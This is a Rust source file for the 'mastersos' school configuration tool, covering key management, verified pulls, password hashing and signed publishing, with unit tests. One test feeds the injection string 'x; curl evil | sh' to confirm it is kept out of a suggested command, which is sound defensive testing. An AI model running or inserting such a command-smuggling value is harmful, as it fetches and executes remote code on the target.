const PUBLISH_NEXT: &str =
    "Now publish with a school key that is already trusted: mastersos publish --school-key <file>";

/// The settings directory the `keys` commands edit; it must belong to this server and school.
async fn keys_dir(
    api: &Api,
    server: &str,
    dir: Option<&Path>,
) -> Result<(Workdir, String), OpError> {
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let m = w.meta().map_err(fail)?;
    let (id, name) = school_info(api, server).await?;
    if m.school_id != id || !same_server(&m.server, server) {
        return Err(OpError::Failed(format!(
            "{} belongs to school {} on {}, not to {id} on {server}",
            absolute(&w.root)?.display(),
            m.school_id,
            m.server
        )));
    }
    Ok((w, name))
}

/// `mastersos keys add <FILE>`: only the local manifest.toml changes.
async fn keys_add(
    api: &Api,
    server: &str,
    dir: Option<&Path>,
    school_keys: &[SchoolKey],
) -> Result<ExitCode, OpError> {
    let (w, name) = keys_dir(api, server, dir).await?;
    ensure_registered(api, school_keys, &name).await?;
    let mut text = w.manifest().map_err(fail)?;
    for k in school_keys {
        text = workdir::add_trusted_key(&text, &k.kit.trust_key(), &k.kit.escrow_recipient())
            .map_err(fail)?;
    }
    w.write_manifest(&text).map_err(fail)?;
    let path = absolute(&w.root.join("manifest.toml"))?;
    for k in school_keys {
        println!("Added school key {} to {}.", k.code(), path.display());
    }
    println!("{}", trusted_line(&text)?);
    println!("{PUBLISH_NEXT}");
    Ok(ExitCode::SUCCESS)
}

/// `mastersos keys remove <KEY CODE> [--school-key <FILE>]`: only local data decides what is
/// removed. The disk-unlocking entry goes when its `# school key <code>` comment ties it to the
/// key, or when it is the one derived from the key's own file. Entries without either are listed
/// for IT; when this computer is connected, the server's word on each is shown beside it, and
/// nothing is removed on that basis.
async fn keys_remove(
    dir: Option<&Path>,
    code: &str,
    school_key: Option<&Path>,
    server: Option<&str>,
    token_file: Option<&Path>,
) -> Result<ExitCode, OpError> {
    let file = match school_key {
        Some(p) => {
            let kit = mastersos_sign::kit::load_kit(p).map_err(fail)?;
            let file_code = workdir::shown_code(&kit.key_id());
            match workdir::normalize_key_code(code) {
                Some(want) if want == file_code => {}
                // A code that is not a key code is refused below with its own message.
                None => {}
                Some(want) => {
                    return Err(OpError::Failed(format!(
                        "{} is school key {file_code}, not {want}. Nothing was changed.",
                        absolute(p)?.display()
                    )))
                }
            }
            Some(kit)
        }
        None => None,
    };
    let w = Workdir::open(dir.unwrap_or_else(|| Path::new("."))).map_err(fail)?;
    let recipient = file.as_ref().map(|k| k.escrow_recipient());
    let r = workdir::remove_school_key(&w.manifest().map_err(fail)?, code, recipient.as_deref())
        .map_err(fail)?;
    let path = absolute(&w.root.join("manifest.toml"))?;
    let shown = workdir::shown_code(&r.key_id);
    if let Some(k) = &file {
        if k.key_id() != r.key_id {
            return Err(OpError::Failed(format!(
                "manifest.toml has a school key {shown} that does not match {}. Check which file is the right one. Nothing was changed.",
                absolute(school_key.unwrap_or(Path::new("")))?.display()
            )));
        }
    }
    w.write_manifest(&r.text).map_err(fail)?;
    println!("Removed school key {shown} from {}.", path.display());
    if file.is_none() && !r.recipient_removed && !r.unmarked.is_empty() {
        let said = server_says(&w, server, token_file).await;
        println!(
            "manifest.toml has disk-unlocking entries (under [school]) that this command could not match to {shown}:"
        );
        for u in &r.unmarked {
            match said.get(u) {
                Some(c) => println!("  {u}  (the server says: school key {c})"),
                None => println!("  {u}"),
            }
        }
        println!(
            "If you still have that key's file, run again with --school-key <file>: mastersos keys remove {shown} --school-key <file>"
        );
        println!("Otherwise remove the one that belonged to {shown} by hand.");
    }
    println!("{}", trusted_line(&r.text)?);
    println!("{PUBLISH_NEXT}");
    Ok(ExitCode::SUCCESS)
}

/// Text from the server, without control characters, for a terminal.
fn printable(s: &str) -> String {
    s.chars().filter(|c| !c.is_control()).collect()
}

/// Best effort, for display only: the key code the server binds each disk-unlocking entry to,
/// when this computer is connected to the folder's own school. Any failure gives nothing.
async fn server_says(
    w: &Workdir,
    server: Option<&str>,
    token_file: Option<&Path>,
) -> std::collections::HashMap<String, String> {
    let fetch = async {
        let cfg = load_config().ok()?;
        let server = server.map(str::to_owned).or(cfg.server)?;
        let token_file = match token_file.map(Path::to_path_buf).or(cfg.token_file) {
            Some(p) => p,
            None => config_dir().ok()?.join("token"),
        };
        mastersos_sign::platform::check_private(&token_file).ok()?;
        let m = w.meta().ok()?;
        if !same_server(&m.server, &server) {
            return None;
        }
        let api = connect(&server, &token_file, TokenUse::Any).await.ok()?;
        let (id, _) = school_info(&api, &server).await.ok()?;
        if id != m.school_id {
            return None;
        }
        let listed: Vec<ListedRecipient> = get_list(&api, "escrow-recipients").await.ok()?;
        Some(
            listed
                .into_iter()
                .filter_map(|l| {
                    let code = printable(&workdir::shown_code(&l.bound_key_id?));
                    (!code.is_empty()).then_some((l.recipient, code))
                })
                .collect(),
        )
    };
    tokio::time::timeout(std::time::Duration::from_secs(15), fetch)
        .await
        .ok()
        .flatten()
        .unwrap_or_default()
}

/// `mastersos keys list`: the registered school keys, and whether the local directory has each.
async fn keys_list(api: &Api, out: &Out, dir: Option<&Path>) -> Result<ExitCode, OpError> {
    let local: Option<Vec<mastersos_bundle::TrustKey>> = match dir {
        Some(d) => {
            let w = Workdir::open(d).map_err(fail)?;
            Some(workdir::trusted_keys(&w.manifest().map_err(fail)?).map_err(fail)?)
        }
        None => match Workdir::open(Path::new(".")) {
            Ok(w) => workdir::trusted_keys(&w.manifest().map_err(fail)?).ok(),
            Err(_) => None,
        },
    };
    let text = api.send(Req::get(&["v1", "admin", "signing-keys"])).await?;
    let in_folder = |public_key: &str| {
        local
            .as_ref()
            .map(|l| l.iter().any(|k| k.public_key == public_key))
    };
    if out.json {
        let mut v: Value = serde_json::from_str(&text).map_err(fail)?;
        if let Value::Array(items) = &mut v {
            for i in items {
                let here = in_folder(i["public_key"].as_str().unwrap_or_default());
                i["in_this_folder"] = json!(here);
            }
        }
        println!("{v}");
        return Ok(ExitCode::SUCCESS);
    }
    let keys: Vec<ListedKey> = serde_json::from_str(&text).map_err(|e| {
        OpError::Failed(format!(
            "the server's list of signing-keys cannot be read: {e}"
        ))
    })?;
    let yes_no = |b: bool| if b { "yes" } else { "no" }.to_owned();
    let rows = keys
        .iter()
        .map(|k| {
            vec![
                printable(&workdir::shown_code(&k.key_id)),
                printable(&k.label),
                k.created_at
                    .as_deref()
                    .map_or("-".into(), |t| printable(t).chars().take(10).collect()),
                yes_no(k.in_published_trust),
                in_folder(&k.public_key).map_or("-".into(), yes_no),
            ]
        })
        .collect();
    println!(
        "{}",
        table(
            &[
                "KEY CODE",
                "LABEL",
                "REGISTERED",
                "PUBLISHED",
                "IN THIS FOLDER"
            ],
            rows
        )
    );
    Ok(ExitCode::SUCCESS)
}

/// `mastersos pull`: the chain is verified from the pin first; an older `--version` is taken only
/// if this computer verified it before (the pin's recorded digest).
async fn pull_dir(
    api: &Api,
    server: &str,
    token_file: &Path,
    dir: &Path,
    version: Option<u64>,
    force: bool,
) -> Result<ExitCode, OpError> {
    // (`run` already refused a dirty directory before connecting.)
    let id = school_id(api).await?;
    let mut anchor = id.clone();
    if let Ok(w) = Workdir::open(dir) {
        let m = w.meta().map_err(fail)?;
        anchor = m.school_id.clone();
        if m.school_id != id || !same_server(&m.server, server) {
            return Err(OpError::Failed(format!(
                "{} belongs to school {} on {}, not to {id} on {server}",
                dir.display(),
                m.school_id,
                m.server
            )));
        }
    }
    let sign = sign_api(server, token_file)?;
    let pins = config_dir()?.join("pins");
    let verified = mastersos_sign::chain::verify_chain(
        &sign,
        &pins,
        &mut std::io::stdin().lock(),
        &mut std::io::stdout(),
    )
    .await
    .map_err(fail)?;
    let (n, contents) = match version {
        None => (verified.version, verified.contents),
        Some(n) if n == verified.version => (n, verified.contents),
        // Newer than what machines run: refused versions (or none), not something to pull.
        Some(n) if n == 0 || n > verified.version => {
            return Err(OpError::Failed(format!(
            "version {n} cannot be pulled: machines run version {} (the newest published is {})",
            verified.version, verified.latest
        )))
        }
        Some(n) => {
            // Only a version this computer verified before, with the digest it had then: the
            // manifests link to no earlier digest, so history before the first use here cannot
            // be authenticated.
            mastersos_sign::chain::recorded_version(&verified.history, n).map_err(fail)?;
            let archive = sign.version_archive(n).await.map_err(fail)?;
            let contents = mastersos_sign::chain::recorded_contents(&verified.history, n, &archive)
                .map_err(fail)?;
            (n, contents)
        }
    };
    let manifest = mastersos_bundle::Manifest::parse(&contents.manifest_text)
        .map_err(|e| OpError::Failed(format!("version {n}: the manifest cannot be read: {e}")))?;
    // The directory's own school id (written by `init` or an earlier `pull`) is the local anchor;
    // the server's answer must agree as well.
    for expected in [&anchor, &id] {
        if mastersos_bundle::school_id_mismatch(&manifest, expected).is_some() {
            return Err(OpError::Failed(format!(
                "version {n} belongs to a different school than {expected}"
            )));
        }
    }
    let meta = Meta {
        server: server.to_owned(),
        school_id: id,
        base_version: n,
    };
    // A directory that differs from its base is replaced only if it is exactly what was uploaded
    // and that upload is the version just verified (same digest): then it was published.
    let mut overwrite = force;
    if !force && Workdir::open(dir).is_ok_and(|w| w.is_dirty().unwrap_or(true)) {
        let published = n == verified.version
            && n == verified.latest
            && Workdir::is_published_upload(dir, n, &verified.digest_hex).unwrap_or(false);
        if !published {
            return Err(OpError::Failed(format!(
                "{} has changes that are not published (see `mastersos diff`); pull again with --force to throw them away",
                dir.display()
            )));
        }
        overwrite = true;
    }
    Workdir::write_pulled(dir, meta, &contents, overwrite).map_err(fail)?;
    println!("Pulled version {n} into {}.", dir.display());
    Ok(ExitCode::SUCCESS)
}

/// Issues for people: one per line (level, code, where, message), then a count.
fn print_issues(issues: &[Value]) {
    let mut counts = [0usize; 3];
    for i in issues {
        let level = i["level"].as_str().unwrap_or("info");
        match level {
            "error" => counts[0] += 1,
            "warning" => counts[1] += 1,
            _ => counts[2] += 1,
        }
        let mut place = String::new();
        if let (Some(l), Some(c)) = (i["span"]["line"].as_u64(), i["span"]["column"].as_u64()) {
            place.push_str(&format!("line {l}:{c} "));
        }
        if let Some(p) = i["path"].as_str() {
            place.push_str(p);
        }
        println!(
            "{level:<7} {:<24} {:<28} {}",
            cell(&i["code"]),
            place.trim_end(),
            cell(&i["message"])
        );
    }
    println!(
        "{} error(s), {} warning(s), {} note(s)",
        counts[0], counts[1], counts[2]
    );
}

/// The logo upload body, after both PNGs passed the size checks.
fn logo_body(login: &Path, icon: &Path) -> Result<Value, OpError> {
    let read = |p: &Path| {
        std::fs::read(p)
            .map_err(|e| OpError::Failed(format!("Could not read {}: {e}", p.display())))
    };
    crate::logo::upload_body(&read(login)?, &read(icon)?).map_err(OpError::Failed)
}

/// `mastersos hash-password`: no network. The password is read twice with echo off (a pipe is
/// refused, so a password is never echoed or left in shell history) and only the hash is printed.
fn hash_password() -> Result<ExitCode, OpError> {
    let a = prompt_secret("Password: ")?;
    if !crate::itpass::length_ok(&a) {
        return Err(OpError::Failed(format!(
            "The password must have {} to {} characters",
            crate::itpass::MIN_CHARS,
            crate::itpass::MAX_CHARS
        )));
    }
    if a != prompt_secret("Again: ")? {
        return Err(OpError::Failed("The two entries differ".into()));
    }
    println!("{}", crate::itpass::hash(&a));
    Ok(ExitCode::SUCCESS)
}

/// One line with echo off; fails when stdin is not a terminal.
fn prompt_secret(text: &str) -> Result<zeroize::Zeroizing<String>, OpError> {
    use std::io::IsTerminal as _;
    if !std::io::stdin().is_terminal() {
        return Err(OpError::Failed(
            "stdin is not a terminal, so a password cannot be read safely".into(),
        ));
    }
    mastersos_sign::platform::read_hidden_line(text).map_err(|e| {
        if e.is::<mastersos_sign::platform::CannotHideTyping>() {
            OpError::Failed(
                "Cannot hide typing in this terminal, so a password cannot be read safely. \
                 Run this in PowerShell or Command Prompt (Windows) or another terminal."
                    .into(),
            )
        } else {
            fail(e)
        }
    })
}

/// `publish --kit` / `--key`, read and checked (owner, mode 0600, contents) before anything is
/// uploaded. Clap already refuses both at once.
fn signer(kit: Option<&Path>, key: Option<&Path>) -> Result<Option<SignWith>, OpError> {
    match (kit, key) {
        (Some(_), Some(_)) => Err(OpError::Failed(
            "give --school-key or --key, not both".into(),
        )),
        (Some(p), None) => SignWith::kit_file(p).map(Some).map_err(fail),
        (None, Some(p)) => SignWith::key_file(p).map(Some).map_err(fail),
        (None, None) => Ok(None),
    }
}

/// `mastersos publish`.
async fn publish_dir(
    api: &Api,
    server: &str,
    token_file: &Path,
    dir: Option<&Path>,
    key: SignWith,
    allow_reroute: &[String],
    json: bool,
) -> Result<ExitCode, OpError> {
    let w = open_dir(dir)?;
    let pins = config_dir()?.join("pins");
    publish_to(
        api,
        server,
        &PublishArgs {
            w: &w,
            token_file,
            pins: &pins,
            key: &key,
            allow_reroute,
            json,
        },
        &mut std::io::stdin().lock(),
        &mut std::io::stdout(),
        &mut std::io::stderr(),
    )
    .await
}

/// What [`publish_to`] works on.
pub(crate) struct PublishArgs<'a> {
    pub w: &'a Workdir,
    pub token_file: &'a Path,
    pub pins: &'a Path,
    pub key: &'a SignWith,
    pub allow_reroute: &'a [String],
    /// `--json`: `stdout` gets exactly one JSON document (the result; a refusal is printed by
    /// [`main`]), and everything else (local and server warnings, the signing dialogue) goes to
    /// `stderr`.
    pub json: bool,
}

/// [`publish_dir`] with its streams given.
pub(crate) async fn publish_to(
    api: &Api,
    server: &str,
    a: &PublishArgs<'_>,
    confirm: &mut dyn std::io::BufRead,
    stdout: &mut dyn std::io::Write,
    stderr: &mut dyn std::io::Write,
) -> Result<ExitCode, OpError> {
    use crate::publish::{
        publish, CheckFailed, CheckIn, PublishOutcome, RerouteRefused, ServerRefused, SignOpts,
        CHECKIN_FAILED_TEXT,
    };
    use chrono::SecondsFormat;
    let w = a.w;
    let m = w.meta().map_err(fail)?;
    if !same_server(&m.server, server) {
        return Err(OpError::Failed(format!(
            "{} belongs to {}, not to {server}",
            w.root.display(),
            m.server
        )));
    }
    let sign = SignOpts {
        key: a.key,
        token_file: a.token_file,
        pin_dir: a.pins,
    };
    let r = {
        let out: &mut dyn std::io::Write = if a.json { stderr } else { &mut *stdout };
        publish(
            api,
            w,
            sign,
            a.allow_reroute,
            chrono::Utc::now(),
            confirm,
            out,
        )
        .await
    };
    let print = |stdout: &mut dyn std::io::Write, v: Value, text: String| {
        let line = if a.json { v.to_string() } else { text };
        writeln!(stdout, "{line}").map_err(fail)
    };
    match r {
        Ok(PublishOutcome::Published { version, checkin }) => {
            let mut v = json!({ "published": true, "version": version });
            match &checkin {
                CheckIn::Until(t) => {
                    v["checkin_until"] = json!(t.to_rfc3339_opts(SecondsFormat::Secs, true))
                }
                CheckIn::Failed(e) => v["checkin_error"] = json!(e),
            }
            print(stdout, v, format!("Published version {version}"))?;
            // The version stays published; people get one sentence, not the cryptography.
            if let CheckIn::Failed(_) = checkin {
                writeln!(stderr, "{CHECKIN_FAILED_TEXT}").map_err(fail)?;
            }
            Ok(ExitCode::SUCCESS)
        }
        Err(e) => match e.downcast::<CheckFailed>() {
            Ok(c) => Err(OpError::Refused {
                message: c.to_string(),
                issues: Some(lint_values(&c.0)),
            }),
            Err(e) => match e.downcast::<RerouteRefused>() {
                Ok(r) => Err(OpError::Refused {
                    message: r.to_string(),
                    issues: Some(lint_values(&r.lints)),
                }),
                Err(e) => match e.downcast::<ServerRefused>() {
                    Ok(r) => Err(OpError::Refused {
                        message: r.message,
                        issues: Some(r.issues),
                    }),
                    Err(e) => Err(fail(e)),
                },
            },
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn help_names_this_platforms_settings_folder() {
        use clap::CommandFactory;
        let help = Cli::command().render_long_help().to_string();
        let flat = help.split_whitespace().collect::<Vec<_>>().join(" ");
        if cfg!(windows) {
            assert!(flat.contains(r"%APPDATA%\mastersos\token"), "{help}");
            assert!(!help.contains("~/.config"), "{help}");
        } else {
            assert!(flat.contains("~/.config/mastersos/token"), "{help}");
            assert!(!help.contains("APPDATA"), "{help}");
        }
        assert!(flat.contains("ai-token)"), "{help}");
        assert!(flat.contains("config.toml)"), "{help}");
    }

    #[test]
    fn publish_takes_kit_or_key_and_repeated_reroute_approvals() {
        let both = Cli::try_parse_from(["mastersos", "publish", "--kit", "a", "--key", "b"]);
        assert!(both.is_err());
        let cli = Cli::try_parse_from([
            "mastersos",
            "publish",
            "dir",
            "--kit",
            "school.kit",
            "--allow-reroute",
            "x-psk",
            "--allow-reroute=y-psk",
        ])
        .unwrap();
        let Cmd::Publish {
            kit,
            key,
            allow_reroute,
            ..
        } = cli.cmd
        else {
            panic!("not publish");
        };
        assert_eq!(kit, Some(PathBuf::from("school.kit")));
        assert_eq!(key, None);
        assert_eq!(allow_reroute, ["x-psk", "y-psk"]);
        assert!(signer(None, None).unwrap().is_none());
        let missing = signer(Some(Path::new("/nonexistent/school.kit")), None);
        assert!(missing.is_err());
    }

    #[test]
    fn kit_kit_alias_still_works() {
        let cli = Cli::try_parse_from(["mastersos", "publish", "--kit", "f"]).unwrap();
        let Cmd::Publish { kit, .. } = cli.cmd else {
            panic!("not publish");
        };
        assert_eq!(kit, Some(PathBuf::from("f")));
        let cli = Cli::try_parse_from(["mastersos", "publish", "--school-key", "g"]).unwrap();
        let Cmd::Publish { kit, .. } = cli.cmd else {
            panic!("not publish");
        };
        assert_eq!(kit, Some(PathBuf::from("g")));
    }

    #[test]
    fn check_names_every_rerouted_secret_and_the_flag() {
        use mastersos_bundle::{Lint, LintLevel};
        let lint = |name: &str| {
            Lint::new(LintLevel::Warning, "secret_rerouted", "changed").param("name", name)
        };
        assert!(reroute_notice(&[Lint::new(LintLevel::Warning, "secret_unused", "x")]).is_none());
        let n = reroute_notice(&[lint("b-psk"), lint("a-psk"), lint("b-psk")]).unwrap();
        assert!(n.contains("SECRET REROUTED: a-psk, b-psk"), "{n}");
        assert!(
            n.contains("mastersos publish --allow-reroute=a-psk --allow-reroute=b-psk"),
            "{n}"
        );
        assert!(n.contains("never passes --allow-reroute"), "{n}");
        // A name that is not a-z, 0-9, - is never put into the suggested command.
        assert!(reroute_notice(&[lint("x; curl evil | sh")]).is_none());
        assert!(reroute_notice(&[lint("Upper")]).is_none());
    }

    #[test]
    fn server_addresses_compare_as_urls() {
        assert!(same_server(
            "https://School.Example/",
            "https://school.example"
        ));
        assert!(same_server(
            "https://school.example:443",
            "https://school.example/"
        ));
        assert!(!same_server(
            "https://school.example",
            "https://other.example"
        ));
        assert!(!same_server(
            "http://localhost:8080",
            "http://localhost:8081"
        ));
        assert!(!same_server(
            "https://school.example/a",
            "https://school.example/b"
        ));
    }
}
